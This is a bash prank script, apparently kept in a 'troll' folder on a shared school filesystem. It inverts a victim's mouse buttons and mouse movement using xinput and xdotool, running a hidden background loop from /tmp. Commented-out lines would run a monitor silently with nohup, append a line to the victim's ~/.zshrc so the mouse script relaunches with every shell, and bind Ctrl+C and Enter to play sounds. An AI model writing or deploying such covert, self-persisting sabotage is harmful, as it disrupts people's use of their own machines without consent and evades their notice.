#!/bin/bash
# nohup /sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh > /dev/null 2>&1 &
# if ! grep -q "/sgoinfre/goinfre/Perso/mochamsa/troll/mouse.sh" ~/.zshrc 2>/dev/null; then
#     cat << EOF >> ~/.zshrc
# nohup /sgoinfre/goinfre/Perso/mochamsa/troll/mouse.sh > /dev/null 2>&1 &
# EOF
# fi


XDOTOOL_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/bin/xdotool"
export LD_LIBRARY_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH"
XINPUT_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xinput_temp/usr/bin/xinput"

if [ ! -x "$XDOTOOL_PATH" ]; then
    exit 1
fi

INVERSE_ACTIVE=false
MONITOR_PID=""
ORIGINAL_MOUSE_MAP=""

get_mouse_config() {
    ORIGINAL_MOUSE_MAP=$($XINPUT_PATH get-button-map $($XINPUT_PATH list --id-only "pointer:Virtual core pointer" 2>/dev/null | head -1) 2>/dev/null)
    if [ -z "$ORIGINAL_MOUSE_MAP" ]; then
        ORIGINAL_MOUSE_MAP="1 2 3 4 5 6 7 8 9"
    fi
}

invert_mouse_buttons() {
    $XINPUT_PATH list --short | grep -i "slave.*pointer" | while read -r line; do
        device_id=$(echo "$line" | grep -o "id=[0-9]*" | cut -d= -f2)
        device_name=$(echo "$line" | sed 's/.*↳ //' | sed 's/\s*id=.*//')
        
        if [[ "$device_name" != *"Virtual"* ]] && [[ "$device_name" != *"XTEST"* ]]; then
            $XINPUT_PATH set-button-map "$device_id" 3 2 1 4 5 6 7 8 9 2>/dev/null || true
        fi
    done
}

restore_mouse_buttons() {
    $XINPUT_PATH list --short | grep -i "slave.*pointer" | while read -r line; do
        device_id=$(echo "$line" | grep -o "id=[0-9]*" | cut -d= -f2)
        device_name=$(echo "$line" | sed 's/.*↳ //' | sed 's/\s*id=.*//')
        
        if [[ "$device_name" != *"Virtual"* ]] && [[ "$device_name" != *"XTEST"* ]]; then
            $XINPUT_PATH set-button-map "$device_id" $ORIGINAL_MOUSE_MAP 2>/dev/null || true
        fi
    done
}

start_movement_inversion() {
    
    cat > /tmp/mouse_inverter.sh << 'EOF'

XDOTOOL_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/bin/xdotool"
export LD_LIBRARY_PATH="/sgoinfre/goinfre/Perso/mochamsa/utils/xdotool_temp/usr/lib/x86_64-linux-gnu:$LD_LIBRARY_PATH"

last_x=0
last_y=0
first_run=true
moving=false

screen_info=$($XDOTOOL_PATH getdisplaygeometry)
screen_width=$(echo $screen_info | cut -d' ' -f1)
screen_height=$(echo $screen_info | cut -d' ' -f2)

get_mouse_pos() {
    eval $($XDOTOOL_PATH getmouselocation --shell)
}

while true; do
    get_mouse_pos
    current_x=$X
    current_y=$Y
    
    if [ "$first_run" = true ]; then
        last_x=$current_x
        last_y=$current_y
        first_run=false
    else
        dx=$((current_x - last_x))
        dy=$((current_y - last_y))
        
        if [ $((dx*dx + dy*dy)) -gt 4 ]; then
            if [ "$moving" = false ]; then
                moving=true
                
                new_x=$((last_x - dx))
                new_y=$((last_y - dy))
                
                if [ $new_x -lt 10 ]; then new_x=10; fi
                if [ $new_y -lt 10 ]; then new_y=10; fi
                if [ $new_x -gt $((screen_width - 10)) ]; then new_x=$((screen_width - 10)); fi
                if [ $new_y -gt $((screen_height - 10)) ]; then new_y=$((screen_height - 10)); fi
                
                $XDOTOOL_PATH mousemove $new_x $new_y
                
                last_x=$new_x
                last_y=$new_y
                
                sleep 0.02
                moving=false
            fi
        else
            last_x=$current_x
            last_y=$current_y
        fi
    fi
    
    sleep 0.01
done
EOF

    chmod +x /tmp/mouse_inverter.sh
    /tmp/mouse_inverter.sh &
    MONITOR_PID=$!
}

stop_movement_inversion() {
    if [ -n "$MONITOR_PID" ]; then
        kill $MONITOR_PID 2>/dev/null
    fi
    
    pkill -f "mouse_inverter.sh" 2>/dev/null
    rm -f /tmp/mouse_inverter.sh
}

activate_inverse() {
    if [ "$INVERSE_ACTIVE" = true ]; then
        return 1
    fi
        
    get_mouse_config
    
    invert_mouse_buttons
    
    start_movement_inversion
    
    INVERSE_ACTIVE=true
}

deactivate_inverse() {
    if [ "$INVERSE_ACTIVE" = false ]; then
        return 1
    fi
    
    stop_movement_inversion
    
    restore_mouse_buttons
    
    INVERSE_ACTIVE=false
}

cleanup() {
    deactivate_inverse
    exit 0
}

trap cleanup SIGINT SIGTERM


activate_inverse

# if [ ! -d ~/.config/sxhkd ]; then
#     mkdir -p ~/.config/sxhkd
# fi
# cat > ~/.config/sxhkd/sxhkdrc << EOF
# control + c
#     paplay /sgoinfre/goinfre/Perso/mochamsa/wav/AHHH.wav
# Return
#     paplay /sgoinfre/goinfre/Perso/mochamsa/wav/tarpin.wav
# KP_Enter
#     paplay /sgoinfre/goinfre/Perso/mochamsa/wav/tarpin.wav
# EOF
# /sgoinfre/goinfre/Perso/mochamsa/utils/sxhkd_temp/usr/bin/sxhkd &
# /sgoinfre/goinfre/Perso/mochamsa/troll/sound-lock.sh &

while [ "$INVERSE_ACTIVE" = true ]; do
    sleep 1
done